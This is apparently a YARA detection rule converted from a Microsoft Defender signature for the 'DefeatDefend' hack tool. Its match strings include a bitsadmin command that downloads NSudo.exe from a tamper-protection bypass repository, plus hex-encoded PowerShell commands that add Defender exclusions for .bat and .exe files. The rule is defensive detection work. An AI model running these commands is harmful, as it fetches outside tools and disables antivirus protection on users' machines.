rule HackTool_Win32_DefeatDefend_A_2147794349_0
{
    meta:
        author = "defender2yara"
        detection_name = "HackTool:Win32/DefeatDefend.A"
        threat_id = "2147794349"
        type = "HackTool"
        platform = "Win32: Windows 32-bit platform"
        family = "DefeatDefend"
        severity = "High"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\\NSudo.exe" ascii //weight: 1
        $x_1_2 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 63 6f 6d 6d 61 6e 64 [0-6] 41 64 64 2d 4d 70 50 72 65 66 65 72 65 6e 63 65 20 2d 45 78 63 6c 75 73 69 6f 6e 45 78 74 65 6e 73 69 6f 6e [0-6] 2e 62 61 74}  //weight: 1, accuracy: Low
        $x_1_3 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 63 6f 6d 6d 61 6e 64 [0-6] 41 64 64 2d 4d 70 50 72 65 66 65 72 65 6e 63 65 20 2d 45 78 63 6c 75 73 69 6f 6e 45 78 74 65 6e 73 69 6f 6e [0-6] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

